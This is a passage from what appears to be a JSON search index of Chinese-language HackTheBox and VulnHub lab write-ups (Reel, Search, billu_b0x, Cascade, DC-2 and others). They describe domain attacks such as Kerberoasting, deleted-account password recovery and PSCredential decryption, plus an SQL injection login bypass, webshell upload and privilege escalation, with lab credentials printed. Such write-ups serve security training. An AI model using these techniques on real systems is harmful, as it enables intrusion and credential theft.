/\u003e\r\n\u003c/p\u003e\n\u003cp\u003e成功反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEba70200d15c647d2d6da1052cfa5eba8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e别的不谈，这玩意儿，延迟是真的高：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE432ff945dd6abe46fc753eea5f84b0a2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e当前在域内：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe3dbfd5a3293d8e8d09af062bd6158f6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上bloodhound把：\u003c/p\u003e\n\u003cp\u003e不让用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7cdb5207d45b80cf3fd62f35c794318fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e继续信息收集，桌面上有一个cred.xml文件\u003c/p\u003e\n\u003cp\u003e该文件是 PSCredential 对象当中\u003c/p\u003e\n\u003cp\u003e可以通过powershell恢复：\u003c/p\u003e\n\u003cp\u003e$credential = import-clixml -path c:\\Users\\nico\\Desktop\\cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().password\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE34d94a35113dc09d309109c4c45ac6a2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e成功获取到了用户名密码：\u003c/p\u003e","title":"0X020 Reel"},{"content":"端口扫描 忘了截图，扫完只开了80端口\ngetshell 文件上传\n提权 发现users.txt\n有GCC，算了，不找了，内核提权吧：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x021-bne0x03-simple/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e忘了截图，扫完只开了80端口\u003c/p\u003e\n\u003ch1 id=\"getshell\"\u003egetshell\u003c/h1\u003e\n\u003cp\u003e文件上传\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE54e65f7dee2516e8b4c03ce7d0e1b6f1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa08866e4af08da14a20aa3db3bb6bd4e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e发现users.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEeb8dec7176e3e59d6d5f048fed7e0557%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有GCC，算了，不找了，内核提权吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa9a83bf1f4c0aaa7753b66370b7e3a10%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x021 BNE0x03-Simple"},{"content":"端口扫描 获取立足点 值得关注的服务:http、LDAP、smb：\n先看smb:\n接着看ldap：\n剩下的就只有http了，重点关注：用户名与密码，漏洞\nabout us是重灾区：\n暂且这样吧：\n用户名枚举：\n枚举失败了：\n但是dirsearch发现了东西：\n但是好像没什么用：\n峰回路转：\ncewl收集的字典发现信息：\n有了用户名，尝试AS-REP Roasting：\n失败了\n只能尝试密码爆破了：\n但是获取策略失败了，也只能试试了：\n密码爆破失败：\n服了，很好，手写体的英语，里面说了密码和用户名：\n发送密码给Hope sharp\nIsolationIsKey?\n哦，这对我的视力和英语都是一个挑战：\n很好，名字的组合也是一个问题：\n提权 机器没有开明显的远程登录端口，如果要登录，那么只能获取管理权限，目前只能围绕着域渗透的思路来进行，先上bloodhound：\n看来主要是集中在这条路线上了：\n目前的身份较为边缘，看来得想办法获取到其他用户身份:\nkerberoasting:\n发现一个\n破解：\n账号：web_svc\n密码：@3ONEmillionbaby\n但是发现这个账户也没有什么特殊的，根据用户名猜测这是web服务的账户：\n返回去看smb:\n两个账户的权限是一样的：\n发现一些有趣的东西：\n用户名：\n做成字典：\n使用@3ONEmillionbaby这个密码，再次爆破一个用户名：\n这个用户好像也没法直接打域控，但是发现有趣的东西了：\nhelpdesk是之前smb没有权限访问的目录：\n但是该目录没有任何东西：\n只能继续信息收集：\n发现user.txt\n但是没权限：\n那就看自己的，这个用户的组名字和桌面有关，可能真得看自己的桌面呢:\n发现信息：\n好像表格里面的名字和smb里面的有些许不一样：\n但是没找到有效密码：\n再仔细观察表格，可以发现列C被隐藏了，但是可以修改左上角的标签查看：\n然后点击左上角的复制标签即可，但是只能在表格内复制：\n做成这种格式：\n再次爆破：\n获得Sierra.Frye用户：\n接下来就可以按照bloodhound的路子走了：\nReadGMSAPassword读取BIR-ADFS-GMSA$的NThash：\n使用GenericAll权限来进行利用，可以获取到TRISTAN.DAVIES用户的hash:\n这里利用方式就比较多了，还可以直接修改密码等：\n破解失败了：\n!!12Honey..*7¡Vamos!\n使用net user来修改TRISTAN.DAVIES用户的密码了：\n使用\u0026ndash;pw-nt-hash来进行hash传递：\nwmiexec登录即可：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x021-search/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbcc7bd75966846206fcbb8e9fed7e937image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf8d179bcc8a0b24c3c2da0380dc7d5a6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE19e74db1c6e96895df83a9c994f2512aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcdc1b87c9c82b1e12d33f29819ca7d81image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的服务:http、LDAP、smb：\u003c/p\u003e\n\u003cp\u003e先看smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf6ced49653d9791722037b9723f60c4dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接着看ldap：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa9a646175e1e6421dceb8f62aacaf44aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e剩下的就只有http了，重点关注：用户名与密码，漏洞\u003c/p\u003e\n\u003cp\u003eabout us是重灾区：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE667dba0de9f8977eabc2c07ee0f2f2daimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd7407382aa354570fdc5406c9f1e8121image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e暂且这样吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb379e193d6d14f258b02a54ef5ca0741image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名枚举：\u003c/p\u003e\n\u003cp\u003e枚举失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbbcf140df7fd8c265b82e1cc28ee5508image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是dirsearch发现了东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8899e2a6a81205dbe6090d87204e596fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE658829953b871cb4dedf12e5da750154image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是好像没什么用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6f7a492420ebd6b8ac06cef394abb7aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e峰回路转：\u003c/p\u003e\n\u003cp\u003ecewl收集的字典发现信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE22841233ed8649a2b798726adbca825bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有了用户名，尝试AS-REP Roasting：\u003c/p\u003e\n\u003cp\u003e失败了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE37aa5438b09281904842ad07bd4f11faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只能尝试密码爆破了：\u003c/p\u003e\n\u003cp\u003e但是获取策略失败了，也只能试试了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5c3197bfdfba3aa3a66835cac92423a8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e密码爆破失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE44a01eb2596f5de56af7c1fa3f424798image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e服了，很好，手写体的英语，里面说了密码和用户名：\u003c/p\u003e\n\u003cp\u003e发送密码给Hope sharp\u003c/p\u003e\n\u003cp\u003eIsolationIsKey?\u003c/p\u003e\n\u003cp\u003e哦，这对我的视力和英语都是一个挑战：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE58812f51dcbc62b315a6a4c3294cb435image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e很好，名字的组合也是一个问题：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3fdb5186c8772f8a4a045478322878e0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e机器没有开明显的远程登录端口，如果要登录，那么只能获取管理权限，目前只能围绕着域渗透的思路来进行，先上bloodhound：\u003c/p\u003e\n\u003cp\u003e看来主要是集中在这条路线上了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6ddc00a4b74a93c6fca3a86638a36a94image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X021 Search"},{"content":"端口扫描 getshell 方法一、代码审计 首先有个坑，burp改POST不行，必须得浏览器才能触发文件下载：\n这里可以知道web目录：\n下载登录主页的源码：\n审计：\n我打眼一看是过滤了单引号’ 然后我就尝试了对单引号进行绕过，16进制、base64、两次URL编码都以失败告终，然后这里的判断逻辑是，sql语句查询出来有内容即可。\n最后无奈看了WP\npayload是：\npassword: \\\nusername: or 1=1 #\n带入到代码里面其实是这样的：\n$run=\u0026#39;select * from auth where pass=\\\u0026#39;\u0026#39;.$pass.\u0026#39;\\\u0026#39; and uname=\\\u0026#39;\u0026#39;.$uname.\u0026#39;\\\u0026#39;\u0026#39;;\r带入后：\rselect * from auth where pass=\u0026#39;\\\u0026#39; and uname=\u0026#39;or 1=1 这里要注意，将sql语句和php分开来理解，要不然会比较麻烦，但是不好理解的是，讲道理这里直接让password=or 1=1 #\\就可以实现了啊。后面借着phpmyadmin试了一下，可以清楚的看到闭合结果：\n这样就非常好理解了因为这样的闭合方式，\u0026rsquo;\u0026rsquo; and uname=\u0026lsquo;成为了password的查询方式，后面没有查询username，而是直接or 1=1，也就是说必须由password传递转义符\\，必须由username传递注释符号#\n然后回到登录后的页面，看起来是有文件上传的，但是直接上传被拦截了，好吧，再次代码审计：\n判断文件的代码，白名单，基本无法绕过：\n然后又去看了一下PW，好好好，确实没发现这个地方可能有文件包含，因为数据包中并没有文件后缀，看起来像是传递参数，但是看了一下代码，是文件包含：\n图片马getsgell：\n方法二 开局扫描的时候，没有扫出来phpmy，两个方法解决，1是使用dirb的big.txt，二是使用dirsearch的默认参数即可\n然后在文件包含时，会发现两个php文件，将他们也下载下来：\n就可以发现数据库账号密码\n然后就可以登录phpmyadmin了，直接提权是没有权限的，所以就直接看账号密码吧\n提权 方法一、 同样有GCC，内核提权吧：\n方法二 当然，该方法理论上在web渗透的时候就可以文件包含来getroot权限，路径为/var/www/phpmy/config.inc.php：\n总结 这台靶机是目前我比较喜欢的一台靶机，思路各种各样，打法也千奇百怪，非常锻炼思维。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x022-billu-b0x/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb16b1c1751f84b969df6604d5a1e8ca6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7d996f5b20ee5336741028b9be2db0de%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"getshell\"\u003egetshell\u003c/h1\u003e\n\u003ch3 id=\"方法一代码审计\"\u003e方法一、代码审计\u003c/h3\u003e\n\u003cp\u003e首先有个坑，burp改POST不行，必须得浏览器才能触发文件下载：\u003c/p\u003e\n\u003cp\u003e这里可以知道web目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8d6398eb6954ccd1aa2b35d7c90d534c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e下载登录主页的源码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEeb258297dd772074ae4fc728a74f1ee2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e审计：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE43509cd1947b9c62a3136bda0f4ef53f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我打眼一看是过滤了单引号’     然后我就尝试了对单引号进行绕过，16进制、base64、两次URL编码都以失败告终，然后这里的判断逻辑是，sql语句查询出来有内容即可。\u003c/p\u003e\n\u003cp\u003e最后无奈看了WP\u003c/p\u003e\n\u003cp\u003epayload是：\u003c/p\u003e\n\u003cp\u003epassword: \\\u003c/p\u003e\n\u003cp\u003eusername: or 1=1 #\u003c/p\u003e\n\u003cp\u003e带入到代码里面其实是这样的：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e$run=\u0026#39;select * from auth where  pass=\\\u0026#39;\u0026#39;.$pass.\u0026#39;\\\u0026#39; and uname=\\\u0026#39;\u0026#39;.$uname.\u0026#39;\\\u0026#39;\u0026#39;;\r\n带入后：\r\nselect * from auth where pass=\u0026#39;\\\u0026#39; and uname=\u0026#39;or 1=1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里要注意，将sql语句和php分开来理解，要不然会比较麻烦，但是不好理解的是，讲道理这里直接让password=or 1=1 #\\就可以实现了啊。后面借着phpmyadmin试了一下，可以清楚的看到闭合结果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2fa0bf7c770bd4ce88620d4fdc95bdf9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这样就非常好理解了因为这样的闭合方式，\u0026rsquo;\u0026rsquo; and uname=\u0026lsquo;成为了password的查询方式，后面没有查询username，而是直接or 1=1，也就是说必须由password传递转义符\\，必须由username传递注释符号#\u003c/p\u003e\n\u003cp\u003e然后回到登录后的页面，看起来是有文件上传的，但是直接上传被拦截了，好吧，再次代码审计：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE57bb2b1f89278bbb717fd406939b09b7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e判断文件的代码，白名单，基本无法绕过：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd5df3ea123376f27b54fac74fc9073d1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后又去看了一下PW，好好好，确实没发现这个地方可能有文件包含，因为数据包中并没有文件后缀，看起来像是传递参数，但是看了一下代码，是文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE38ebf5aaa3610f2477df9b8015f9e4c7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e图片马getsgell：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE743c6855b2e9b184524bf4c0cb63c81f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"方法二\"\u003e方法二\u003c/h3\u003e\n\u003cp\u003e开局扫描的时候，没有扫出来phpmy，两个方法解决，1是使用dirb的big.txt，二是使用dirsearch的默认参数即可\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1331932f49ccb2d829bb9a148bc7b08b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后在文件包含时，会发现两个php文件，将他们也下载下来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5d7e136115a110a2a9783c87d79faac0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x022 billu b0x"},{"content":"端口扫描 端口扫描就出现问题了，不让扫描？\n最开始7000速率不行，改成2000就可以了：\n获取立足点 关键端口开放情况，445、389、3268、5985\n有匿名访问：\n获取了用户名，可以尝试密码喷洒，或者AS-REP Roasting：\n失败了，但是这里面密码喷洒一般很少：\n查看用户所有信息：\n发现密码：\nr.thompson\nrY4n5eva\nwinrm登录失败，回头看smb:\n翻查了一圈，把所有东西都下载下来了：\n新用户？\n别的不说，在目前的情况下，我认为这些文件里面，应该是存在登录成功的方式的：\n破解vnc的密码：\n用户名为：\n登陆成功：\n提权 bloodhound：\n好像没路子：\n看看winpe:\n好像没有头绪，应该是得继续信息收集：\n再去使用s.smith登录smb:\n发现db文件：\n发现是sqllite文件：\nsqlitebrowser Audit.db：\n这个文件识别了一下，好像破解不了，需要逆向：\n核心是这两个文件：\n.net开发的：\n用dnSpy逆向：\n密码在这一步进行解密：\n点进去：\n加密方式、密钥、偏移量都有了：\nhttps://www.fly63.com/tool/cipher/\n在线解密：\nw3lc0meFr31nd\n远程管理组，应该可以登录：\n再次bloodhound查询：\n也没有明显的路径：\n再次peass:\n也没发现什么东西：\n查看该用户权限:\n属于：AD Recycle Bin组\n简单查了一下：\n查看已经删除了的用户：\nGet-ADObject -filter \u0026lsquo;isDeleted -eq $true -and name -ne \u0026ldquo;Deleted Objects\u0026rdquo;\u0026rsquo; -includeDeletedObjects\n这是之前的文件里面提到了的：\n获取该用户的详细信息：\nGet-ADObject -filter { SAMAccountName -eq \u0026ldquo;TempAdmin\u0026rdquo; } -includeDeletedObjects -property *\n密码是：\nbaCT3r1aN00dles\n之前的文章里面说到，这个密码是管理员密码：\n总结： 这个靶机涉及的东西有点多，包括对ldap的理解、简单的逆向分析、细心的信息收集等。\n流程和思路梳理：\n1、端口扫描速率过会导致扫不出来，得降低速率。\n2、LDAP匿名访问，需要查询详细的用户信息，通过工具windapsearch.py实现，效果较好\n3、获取到一个普通用户r.thompson，但是该用户无法登录winrm，只能另寻他法，使用该用户登录smb\n4、通过smb发现一些信息，其中包括tempadmin的密码是管理员密码、vnc注册表文件\n5、通过VNC注册表文件恢复，复原出密码，存在与s.smith 目录下，为该用户的密码\n6、s.smith可以登录winrm，但是该主机任然无法主机提权或者bloodhound有路线到domain admin\n7、再次回到smb，使用s.smith账户，进入audit目录，该目录下存在db文件，但是加密状态\n8、使用dnspy反编译.net程序，得到解密的偏移量和密钥，成功破解db密码，获得arksvc账户\n9、再次登录winrm，发现该账户存在AD Recycle Bin组内，这个是负责回收站功能的组\n10、通过这个组权限，成功获取到已经删除了的账户tempadmin的密码\n11、使用该密码成功登录administrator\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x022-cascade/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e端口扫描就出现问题了，不让扫描？\u003c/p\u003e\n\u003cp\u003e最开始7000速率不行，改成2000就可以了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5b4510dec7bf52d0a6fdb5778f11656eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7c3558936730c318e4f16a7a4710881aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe59f9ec75d3b2e07289bfda3ede34301image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e关键端口开放情况，445、389、3268、5985\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEef367b5e20ce2fe2e6c5c7af8f0a1a33image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE534850d681dd10754905937f9f8f01a7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有匿名访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf72e7106a3b68884c2de05b953cd7289image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e获取了用户名，可以尝试密码喷洒，或者AS-REP Roasting：\u003c/p\u003e\n\u003cp\u003e失败了，但是这里面密码喷洒一般很少：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE81b62e47f4b347b26233abc593d71817image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看用户所有信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE80e99820f3a63b441c8f8ae31c5f680aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密码：\u003c/p\u003e\n\u003cp\u003er.thompson\u003c/p\u003e\n\u003cp\u003erY4n5eva\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5ebcb345680f2cf3e99d1a5346ef60e2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinrm登录失败，回头看smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE341c8acb1447d66cb8f6db4647876625image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e翻查了一圈，把所有东西都下载下来了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE487616986a1b1f7e82dbaa82257d6cc2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e新用户？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE664b982284b36d00711ac12bf5d60859image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e别的不说，在目前的情况下，我认为这些文件里面，应该是存在登录成功的方式的：\u003c/p\u003e\n\u003cp\u003e破解vnc的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE08d05305af661ad047e2733e0594d088image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名为：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE73254ba3dd435455c5bcae596a3cb7b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登陆成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9fa334cf4469d5319461bc6c3a2e0144image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003ebloodhound：\u003c/p\u003e\n\u003cp\u003e好像没路子：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc9fb672ffed27c19776681e4b0ed4a49image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看看winpe:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9126de058238ce21cb0fec0d0eb12e3cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0df3b5f3f25492129fe291418d862bf1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好像没有头绪，应该是得继续信息收集：\u003c/p\u003e\n\u003cp\u003e再去使用s.smith登录smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb1693bd21024dc11b08f1032713bfaedimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现db文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6ee9797f68c4c925e44ed3e9677d69c4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现是sqllite文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4c8ea33241bc97ef76aab785e2d4df3cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X022 cascade"},{"content":"端口扫描 记得改hosts\n渗透测试 wpscan \u0026ndash;url http://dc-2/ \u0026ndash;enumerate u\n发现三个用户\n爆破，常规的爆破字典爆不出来：\n翻查了一下网站，作者有提示：\ncewl收集密码：\n爆破成功：\njerry / adipiscing\ntom / parturient\n登录web成功，但是由于权限不够无法getshell，也是卡了好久，才想起来可以去看看ssh端口：\n提权 这里就有点恶心了，大部分命令不给用：\n提示说让我们切换到jerry用户，然后命令还是不给用，然后我尝试了vi提权的操作，发现是操作对了的，但是我没发现是命令没找到，我淦：\n这里就是命令无法找到了，而不是受限的环境了：\n查看环境变量：\n改变环境变量，理论上这步可以直接输入绝对路径来执行命令，如果你记得所有的命令路径的话：\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\n切换到jerry，sudo提权，有gtfobins没啥好说的：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x023-dc-2/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e记得改hosts\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdc4dca9dd3e02ca737028f5f316a8cc0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbcf6be2c15b5a0c2388aba99105bafa5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003ewpscan \u0026ndash;url \u003ca 